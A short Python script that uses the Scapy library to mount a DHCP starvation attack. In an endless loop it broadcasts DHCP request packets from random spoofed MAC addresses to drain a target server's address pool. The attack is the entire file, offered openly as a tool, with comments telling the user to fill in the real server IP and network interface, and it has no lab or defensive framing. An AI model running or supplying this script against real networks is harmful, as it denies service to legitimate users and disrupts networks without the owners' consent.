from scapy.all import *
import random

from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import UDP
from scapy.layers.l2 import Ether


def random_mac():
    """
    Generate a random MAC address.
    """
    return "02:00:00:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )

def dhcp_starvation(target_ip, interface):
    """
    Send DHCP requests with spoofed MAC addresses to exhaust the DHCP pool.
    """
    conf.iface = interface
    while True:
        mac = random_mac()
        dhcp_request = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                       IP(src="0.0.0.0", dst="255.255.255.255") / \
                       UDP(sport=68, dport=67) / \
                       BOOTP(chaddr=bytes.fromhex(mac.replace(":", ""))) / \
                       DHCP(options=[("message-type", "request"),
                                     ("server_id", target_ip),
                                     ("requested_addr", "0.0.0.0"),
                                     "end"])

        sendp(dhcp_request, verbose=0)

if __name__ == "__main__":
    target_ip = "127.0.0.1"  # Replace with the DHCP server IP address
    interface = '\\Device\\NPF_Loopback'  # Replace with your network interface
    dhcp_starvation(target_ip, interface)
